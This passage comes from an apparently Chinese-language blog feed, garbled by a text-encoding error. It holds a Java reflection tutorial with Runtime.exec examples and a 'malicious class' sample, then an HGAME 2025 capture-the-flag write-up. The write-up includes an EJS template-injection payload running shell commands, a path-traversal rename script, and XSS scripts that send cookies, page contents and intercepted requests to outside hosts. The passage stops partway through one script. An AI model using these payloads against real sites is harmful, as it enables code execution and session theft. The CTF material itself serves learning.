class="line">åå°„æœºåˆ¶è®©ç¨‹åºä¸å†å±€é™äºâ€œé™æ€â€çš„ä»£ç ç»“æ„ï¼Œ</span><br><span class="line">è€Œæ˜¯å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€â€œåæ˜ â€å‡ºç±»çš„å†…éƒ¨ç»†èŠ‚ï¼Œä»è€Œå®ç°çµæ´»çš„ç¼–ç¨‹ã€‚</span><br></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒä½œç”¨"><a href="#æ ¸å¿ƒä½œç”¨" class="headerlink" title="æ ¸å¿ƒä½œç”¨"></a>æ ¸å¿ƒä½œç”¨</h3><p>åå°„çš„æ ¸å¿ƒä½œç”¨:</p><ul><li>åŠ¨æ€è·å–ç±»çš„ä¿¡æ¯ï¼šåœ¨è¿è¡Œæ—¶åˆ†æç±»çš„ç»“æ„ã€‚</li><li>åŠ¨æ€åˆ›å»ºå¯¹è±¡ï¼šé€šè¿‡ç±»åå®ä¾‹åŒ–å¯¹è±¡ã€‚</li><li>åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼šæ ¹æ®æ–¹æ³•åå’Œå‚æ•°è°ƒç”¨æ–¹æ³•ã€‚</li><li>è®¿é—®ç§æœ‰æˆå‘˜ï¼šçªç ´è®¿é—®æƒé™é™åˆ¶ï¼ˆéœ€ä¸»åŠ¨æˆæƒï¼‰ã€‚</li><li>é€šç”¨æ¡†æ¶å¼€å‘ï¼šå¦‚<code>Spring</code>ã€<code>Hibernate</code>ç­‰æ¡†æ¶ä¾èµ–åå°„å®ç°ä¾èµ–æ³¨å…¥ã€åŠ¨æ€ä»£ç†ç­‰ã€‚</li></ul><h3 id="åå°„çš„æ ¸å¿ƒç±»"><a href="#åå°„çš„æ ¸å¿ƒç±»" class="headerlink" title="åå°„çš„æ ¸å¿ƒç±»"></a>åå°„çš„æ ¸å¿ƒç±»</h3><ul><li><h4 id="Classç±»ï¼šè¡¨ç¤ºä¸€ä¸ªç±»æˆ–æ¥å£ï¼Œæ˜¯æ‰€æœ‰åå°„æ“ä½œçš„å…¥å£ã€‚"><a href="#Classç±»ï¼šè¡¨ç¤ºä¸€ä¸ªç±»æˆ–æ¥å£ï¼Œæ˜¯æ‰€æœ‰åå°„æ“ä½œçš„å…¥å£ã€‚" class="headerlink" title="Classç±»ï¼šè¡¨ç¤ºä¸€ä¸ªç±»æˆ–æ¥å£ï¼Œæ˜¯æ‰€æœ‰åå°„æ“ä½œçš„å…¥å£ã€‚"></a><code>Class</code>ç±»ï¼šè¡¨ç¤ºä¸€ä¸ªç±»æˆ–æ¥å£ï¼Œæ˜¯æ‰€æœ‰åå°„æ“ä½œçš„å…¥å£ã€‚</h4></li></ul><p>è·å–ç±»çš„classå¯¹è±¡:</p><h5 id="é€šè¿‡ç±»å-classï¼š"><a href="#é€šè¿‡ç±»å-classï¼š" class="headerlink" title="é€šè¿‡ç±»å.classï¼š"></a>é€šè¿‡ç±»å.classï¼š</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;User&gt; clazz = User.class;</span><br></pre></td></tr></table></figure><h5 id="é€šè¿‡å¯¹è±¡å®ä¾‹çš„getClass-æ–¹æ³•ï¼š"><a href="#é€šè¿‡å¯¹è±¡å®ä¾‹çš„getClass-æ–¹æ³•ï¼š" class="headerlink" title="é€šè¿‡å¯¹è±¡å®ä¾‹çš„getClass()æ–¹æ³•ï¼š"></a>é€šè¿‡å¯¹è±¡å®ä¾‹çš„getClass()æ–¹æ³•ï¼š</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">Class&lt;?&gt; clazz = user.getClass();</span><br></pre></td></tr></table></figure><h5 id="é€šè¿‡Class-forName-â€œå…¨é™å®šç±»åâ€-ï¼š"><a href="#é€šè¿‡Class-forName-â€œå…¨é™å®šç±»åâ€-ï¼š" class="headerlink" title="é€šè¿‡Class.forName(â€œå…¨é™å®šç±»åâ€)ï¼š"></a>é€šè¿‡Class.forName(â€œå…¨é™å®šç±»åâ€)ï¼š</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.User&quot;</span>); <span class="comment">// éœ€å¤„ç†ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå¯¹è±¡å®ä¾‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡æ— å‚æ„é€ å™¨åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> clazz.newInstance(); <span class="comment">// å·²è¿‡æ—¶ï¼Œæ¨èç”¨getDeclaredConstructor().newInstance()</span></span><br><span class="line"><span class="comment">// é€šè¿‡æœ‰å‚æ„é€ å™¨åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) constructor.newInstance(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ–¹æ³•:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">// è·å–å…¬æœ‰æ–¹æ³•</span></span><br><span class="line">method.invoke(user, <span class="string">&quot;Bob&quot;</span>); <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨ç§æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">privateMethod.setAccessible(<span class="literal">true</span>); <span class="comment">// çªç ´è®¿é—®é™åˆ¶</span></span><br><span class="line">privateMethod.invoke(user);</span><br></pre></td></tr></table></figure><p>è®¿é—®å­—æ®µ(å±æ€§):</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// è®¿é—®ç§æœ‰å­—æ®µ</span></span><br><span class="line">field.set(user, <span class="string">&quot;Charlie&quot;</span>); <span class="comment">// è®¾ç½®å€¼</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) field.get(user); <span class="comment">// è·å–å€¼</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="Constructorç±»ï¼šè¡¨ç¤ºç±»çš„æ„é€ æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ã€‚"><a href="#Constructorç±»ï¼šè¡¨ç¤ºç±»çš„æ„é€ æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ã€‚" class="headerlink" title="Constructorç±»ï¼šè¡¨ç¤ºç±»çš„æ„é€ æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ã€‚"></a><code>Constructor</code>ç±»ï¼šè¡¨ç¤ºç±»çš„æ„é€ æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ã€‚</h4></li></ul><p>å’Œç±»åä¸€æ ·çš„å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å…¬å…±æ„é€ æ–¹æ³•è°ƒç”¨ï¼Œname: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åå°„è°ƒç”¨</span></span><br><span class="line">Constructor&lt;MyClass&gt; constructor = MyClass.class.getConstructor(String.class);</span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨å‘½ä»¤æ‰§è¡Œç±»:<code>ProcessBuilder</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).star</span><br><span class="line"><span class="title function_">t</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><ul><li><h4 id="Methodç±»ï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ï¼Œç”¨äºè°ƒç”¨æ–¹æ³•ã€‚"><a href="#Methodç±»ï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ï¼Œç”¨äºè°ƒç”¨æ–¹æ³•ã€‚" class="headerlink" title="Methodç±»ï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ï¼Œç”¨äºè°ƒç”¨æ–¹æ³•ã€‚"></a><code>Method</code>ç±»ï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ï¼Œç”¨äºè°ƒç”¨æ–¹æ³•ã€‚</h4></li></ul><p>æ ¸å¿ƒæ˜¯<code>invoke(è°ƒç”¨)</code>æ–¹æ³•<br>è·å– <code>Method</code> å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">è·å–å…¬å…±æ–¹æ³•ï¼ˆåŒ…æ‹¬ç»§æ‰¿çš„ï¼‰ã€‚</span><br><span class="line">Class.getMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è·å–æœ¬ç±»ä¸­å£°æ˜çš„æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼‰ã€‚</span><br><span class="line">Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">setAccessible ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„ã€‚</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å– String ç±»çš„ toUpperCase æ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;toUpperCase&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºå¯¹è±¡å®ä¾‹</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–¹æ³•ï¼šstr.toUpperCase()</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(str); <span class="comment">// å‚æ•°ä¸ºå¯¹è±¡å®ä¾‹ï¼ˆstrï¼‰å’Œç©ºå‚æ•°</span></span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// è¾“å‡ºï¼šHELLO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹2ï¼šå¸¦å‚æ•°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å–é™æ€æ–¹æ³• add(int, int)</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MathUtils.class.getMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è°ƒç”¨é™æ€æ–¹æ³•ï¼ˆobj å‚æ•°ä¼  nullï¼‰</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// è¾“å‡ºï¼š8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="Fieldç±»ï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œç”¨äºè¯»å†™å­—æ®µå€¼ã€‚"><a href="#Fieldç±»ï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œç”¨äºè¯»å†™å­—æ®µå€¼ã€‚" class="headerlink" title="Fieldç±»ï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œç”¨äºè¯»å†™å­—æ®µå€¼ã€‚"></a><code>Field</code>ç±»ï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆæˆå‘˜å˜é‡ï¼‰ï¼Œç”¨äºè¯»å†™å­—æ®µå€¼ã€‚</h4></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">field.set(obj, value);</span><br></pre></td></tr></table></figure><ul><li><h4 id="Modifierç±»ï¼šè§£æç±»ã€æ–¹æ³•æˆ–å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚publicã€privateï¼‰ã€‚"><a href="#Modifierç±»ï¼šè§£æç±»ã€æ–¹æ³•æˆ–å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚publicã€privateï¼‰ã€‚" class="headerlink" title="Modifierç±»ï¼šè§£æç±»ã€æ–¹æ³•æˆ–å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚publicã€privateï¼‰ã€‚"></a><code>Modifier</code>ç±»ï¼šè§£æç±»ã€æ–¹æ³•æˆ–å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚<code>public</code>ã€<code>private</code>ï¼‰ã€‚</h4></li></ul><h1 id="æ¶æ„ç±»ç¤ºä¾‹"><a href="#æ¶æ„ç±»ç¤ºä¾‹" class="headerlink" title="æ¶æ„ç±»ç¤ºä¾‹"></a>æ¶æ„ç±»ç¤ºä¾‹</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2025</title>
      <link href="/2025/03/09/hgame2025/"/>
      <url>/2025/03/09/hgame2025/</url>
      
        <content type="html"><![CDATA[<h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>ç›´æ¥çœ‹index.jsä¸­æœ‰ä¸€æ®µ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">here is your <span class="attr">gift</span>:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br></pre></td></tr></table></figure><p>base64è§£ç å¾—:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåº”è¯¥æ˜¯æ …æ å¯†ç <br>æ¯”è¾ƒçŸ­ï¼Œç›´æ¥äººè‚‰è¿˜åŸä¸€ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4tr</span><br><span class="line">gm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç«–ç€è¯»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;u_4re_pacman_m4ster&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>çœ‹é¢˜å¹²ä»¥åŠä»£ç ï¼Œå‘ç°ç›´æ¥åŠ è½½mortis.ejsè¿è¡Œï¼Œé‚£ä¹ˆå°è¯•è¿›è¡Œè¦†ç›–<br>å…ˆæ„é€ :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åä½¿ç”¨renameæ¥å£è¿›è¡Œè¦†ç›–,<br>å°è¯•äº†å‡ æ¬¡åè¿™ä¸ªè·¯å¾„è¦†ç›–æˆåŠŸ:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://119.45.235.21:30377/rename&quot;</span>  <span class="comment"># æ›¿æ¢ä¸ºä½ çš„æœåŠ¡å™¨åœ°å€</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;oldName&quot;</span>: <span class="string">&quot;mortis.ejs&quot;</span>,  <span class="comment"># æ—§æ–‡ä»¶å</span></span><br><span class="line">    <span class="string">&quot;newName&quot;</span>: <span class="string">&quot;../views/mortis.ejs&quot;</span>   <span class="comment"># æ–°æ–‡ä»¶å</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;é‡å‘½åå¤±è´¥: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/app/static/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;é‡å‘½åå¤±è´¥: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/views/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Success: &#123;&#x27;message&#x27;: &#x27;æ–‡ä»¶é‡å‘½åæˆåŠŸ&#x27;&#125;</span><br></pre></td></tr></table></figure><p>è¦†ç›–ååˆ·æ–°ç½‘ç«™é¦–é¡µæŸ¥æ‰¾hgameè·å¾—flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Av3_muJ1c4_haS-Br0keN_UP-BUt_We-h@Ve-UMiTaKi66&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard-1"><a href="#Level-69-MysteryMessageBoard-1" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>å·²çŸ¥ç”¨æˆ·å:shallot<br>ä½¿ç”¨å¼±ç§˜é’¥çˆ†ç ´å¾—å¯†ç :888888</p><p>çœ‹é¢˜å¹²çŒœæµ‹æ˜¯xss<br>ä¹‹å‰ä¸çŸ¥é“æ€ä¹ˆç™»å½•çš„æ—¶å€™å‘ç°æœ‰&#x2F;adminæ¥å£ï¼Œç¡®å®šæ˜¯xss<br>åŠ«æŒcookie:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// åŸºç¡€æ•°æ®æ”¶é›†</span></span><br><span class="line"><span class="keyword">const</span> attackerServer = <span class="string">&#x27;http://fy0gjk0x.requestrepo.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. æ‹¦æˆªåŸç”Ÿ fetch æ–¹æ³•</span></span><br><span class="line"><span class="keyword">const</span> originalFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">function</span>(<span class="params">url, options</span>) &#123;</span><br><span class="line">  <span class="comment">// æ•è·è¯·æ±‚æ•°æ®</span></span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;fetch&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">method</span>: options?.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: options?.<span class="property">headers</span> ? &#123;...options.<span class="property">headers</span>&#125; : &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: options?.<span class="property">body</span> ? options.<span class="property">body</span>.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‘é€åˆ°æ”»å‡»æœåŠ¡å™¨</span></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> originalFetch.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. æ‹¦æˆª XMLHttpRequest</span></span><br><span class="line"><span class="keyword">const</span> originalXHROpen = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line"><span class="keyword">const</span> originalXHRSend = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_method</span> = method;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_url</span> = url;</span><br><span class="line">  <span class="keyword">return</span> originalXHROpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span> = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;xhr&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="variable language_">this</span>.<span class="property">_url</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="variable language_">this</span>.<span class="property">_method</span>,</span><br><span class="line">    <span class="attr">headers</span>: <span class="variable language_">this</span>.<span class="property">_headers</span> || &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: body ? body.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line">  <span class="keyword">return</span> originalXHRSend.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. æ•è·é¡µé¢åˆå§‹åŠ è½½çš„Cookie</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">    <span class="attr">cookies</span>: <span class="variable language_">document</span>.<span class="property">cookie</span>,</span><br><span class="line">    <span class="attr">dom</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">outerHTML</span>,</span><br><span class="line">    <span class="attr">referrer</span>: <span class="variable language_">document</span>.<span class="property">referrer</span>,</span><br><span class="line">    <span class="attr">header</span>:<span class="variable language_">document</span></span><br><span class="line">  &#125;;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span 